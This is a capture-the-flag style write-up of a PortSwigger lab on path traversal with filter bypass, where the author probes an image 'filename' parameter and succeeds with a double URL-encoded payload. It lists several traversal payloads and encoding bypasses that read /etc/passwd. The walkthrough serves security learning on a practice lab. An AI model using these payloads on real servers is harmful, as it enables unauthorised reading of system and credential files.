---
title: " PortSwiggerlabs: File path traversal, traversal sequences stripped with superfluous URL-decode "
date: 2026-08-21 00:00:00 +0000
categories: [PortSwiggerLabs , Path Traversal ]
tags: [PortSwiggerLabs , Path Traversal , Challenge , Web_Attacks ]
---


## Scenario : 

This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.


## Solution : 

<img width="1723" height="858" alt="image" src="https://github.com/user-attachments/assets/29ffe943-7207-4f28-95a4-651b4692ea76" />

First we navigate the app like a normal user , then we check Burp's History to see if we find something useful . 

<img width="1633" height="810" alt="image" src="https://github.com/user-attachments/assets/53a31f0e-7279-474f-9c82-490379c07725" />

We find 2 parameters , one for the Products ID , and the other one , filename is for the image that's rendered to us for each product . 

I will assume that Product ID isn't vulnerable just like the labs before , so let's test Filename instead : 

First i tried a simple LFI payload : 

```bash
../../../../../etc/passwd
/../../../../../../etc/passwd
```

<img width="1353" height="561" alt="image" src="https://github.com/user-attachments/assets/0b095d07-16d1-4ee4-8d06-9e0cef1d8d46" />

Both of them returned No such file , let's try giving the filename instead without any backslashes . 

<img width="1330" height="666" alt="image" src="https://github.com/user-attachments/assets/53031cf1-0f2c-4011-b893-921a4575dab0" />

Didn't work either , let's test different Payloads from Payload All The Things :

```text
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
```

Maybe there is a WAF blocking the basic payloads , let's test some WAF bypasses :

```bash
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
....//....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

None of these worked sadly , let's try to double encode the payload, let's use Cyberchef for that : 

<img width="1920" height="821" alt="image" src="https://github.com/user-attachments/assets/4f29e6ac-102a-4bfd-82dc-a1edf3098194" />

Now our payload is : 

```bash
%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

Let's test this one : 

<img width="1507" height="760" alt="image" src="https://github.com/user-attachments/assets/1a2b7a82-c7f7-4a5d-998e-8caa2289f276" />

This worked perfectly . 

Now if we go back to the lab , it should be Solved . 

<img width="1808" height="866" alt="image" src="https://github.com/user-attachments/assets/347d9a24-8566-48c4-bfbe-8f4f32e718df" />

That was all for this lab , see you in the next one :) 


